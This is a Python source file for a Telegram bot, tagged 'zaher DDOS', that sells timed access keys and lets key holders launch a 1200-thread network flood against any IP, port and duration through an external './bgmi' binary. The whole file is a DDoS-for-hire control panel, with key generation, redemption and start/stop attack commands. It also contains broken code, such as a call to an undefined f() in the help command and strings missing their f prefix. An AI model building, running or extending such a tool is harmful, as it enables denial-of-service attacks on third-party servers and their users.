#zaher DDOS

import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME


USER_FILE = "users.json"
KEY_FILE = "keys.json"

flooding_process = None
flooding_command = None


DEFAULT_THREADS = 1200


users = {}
keys = {}


def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"ᴇʀʀᴏʀ ʟᴏᴀᴅɪɴɢ ᴜꜱᴇʀꜱ: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"ᴇʀʀᴏʀ ʟᴏᴀᴅɪɴɢ ᴋᴇʏꜱ: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command to generate keys
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ: {key}\nᴇxᴘɪʀᴇꜱ ᴏɴ: {expiration_date}"
            except ValueError:
                response = f"ᴘʟᴇᴀꜱᴇ ᴀᴛᴛᴀᴄʜ ᴀ ᴠᴀʟɪᴅ ᴛɪᴍᴇ ꜱᴘᴀɴ ɪɴ ʜᴏᴜʀꜱ/ᴅᴀʏꜱ"
        else:
            response = "ᴜꜱᴀɢᴇ: /ɢᴇɴᴋᴇʏ <ᴀᴍᴏᴜɴᴛ> <ʜᴏᴜʀꜱ/ᴅᴀʏꜱ>"
    else:
        response = f"ʏᴏᴜ ᴀɪɴ'ᴛ ᴀɴ ᴏᴡɴᴇʀ💀! ᴏɴʟʏ @{OWNER_USERNAME} ɪꜱ ꜱᴜᴘᴘᴏꜱᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ"

    await update.message.reply_text(response)


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✓ ᴋᴇʏ ʀᴇᴅᴇᴇᴍᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ! ᴀᴄᴄᴇꜱꜱ ɢʀᴀɴᴛᴇᴅ ᴜɴᴛɪʟ: {users[user_id]}"
        else:
            response = f""
        response = f"ᴜꜱᴀɢᴇ: /redeem <key> ɪꜰ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴏɴᴇ ʙᴜʏ ꜰʀᴏᴍ @{OWNER_USERNAME}"

    await update.message.reply_text(response)


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "ᴀᴜᴛʜᴏʀɪꜱᴇᴅ ᴜꜱᴇʀꜱ:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = f"ɴᴏ ᴀᴜᴛʜᴏʀɪꜱᴇᴅ ᴜꜱᴇʀꜱ"
    else:
        response = f"ʏᴏᴜ ᴀɪɴ'ᴛ ᴀɴ ᴏᴡɴᴇʀ💀! ᴏɴʟʏ @{OWNER_USERNAME} ɪꜱ ꜱᴜᴘᴘᴏꜱᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ."
    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ! ᴘʟᴇᴀꜱᴇ ʀᴇᴅᴇᴇᴍ ᴀ ᴠᴀʟɪᴅ ᴋᴇʏ ꜰɪʀꜱᴛ,\nɪꜰ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴏɴᴇ ʙᴜʏ ꜰʀᴏᴍ @{OWNER_USERNAME} ")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'ᴀᴛᴛᴀᴄᴋ ᴘᴀʀᴀᴍᴇᴛᴇʀꜱ ꜱᴇᴛ: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ! ᴘʟᴇᴀꜱᴇ ʀᴇᴅᴇᴇᴍ ᴀ ᴠᴀʟɪᴅ ᴋᴇʏ ꜰɪʀꜱᴛ,\nɪꜰ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴏɴᴇ ʙᴜʏ ꜰʀᴏᴍ @{OWNER_USERNAME}")
        return

    if flooding_process is not None:
        await update.message.reply_text('ᴀɴ ᴀᴛᴛᴀᴄᴋ ɪꜱ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!')
        return

    if flooding_command is None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('ᴀᴛᴛᴀᴄᴋ ꜱᴛᴀʀᴛᴇᴅ!')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ! ᴘʟᴇᴀꜱᴇ ʀᴇᴅᴇᴇᴍ ᴀ ᴠᴀʟɪᴅ ᴋᴇʏ ꜰɪʀꜱᴛ,\nɪꜰ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴏɴᴇ ʙᴜʏ ꜰʀᴏᴍ @{OWNER_USERNAME} ")
        return

    if flooding_process is None:
        await update.message.reply_text('ɴᴏ ᴀᴛᴛᴀᴄᴋ ɪꜱ ʀᴜɴɴɪɴɢ!')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('ᴀᴛᴛᴀᴄᴋ ꜱᴛᴏᴘᴘᴇᴅ!')


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message)
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ʏᴏᴜ ᴀɪɴ'ᴛ ᴀɴ ᴏᴡɴᴇʀ💀! ᴏɴʟʏ {OWNER_USERNAME} ɪꜱ ꜱᴜᴘᴘᴏꜱᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ."
    
    await update.message.reply_text(response)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = f(
        "Welcome to the Flooding Bot by OWNER- @{OWNER_USERNAME}...! Here are the available commands:\n\n"
        "Admin Commands:\n"
        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
        "/allusers - Show all authorized users.\n"
        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
        "User Commands:\n"
        "/redeem <key> - Redeem a key to gain access.\n"
        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
        "/start - Start the flooding process.\n"
        "/stop - Stop the flooding process.\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
#zaher_ddos
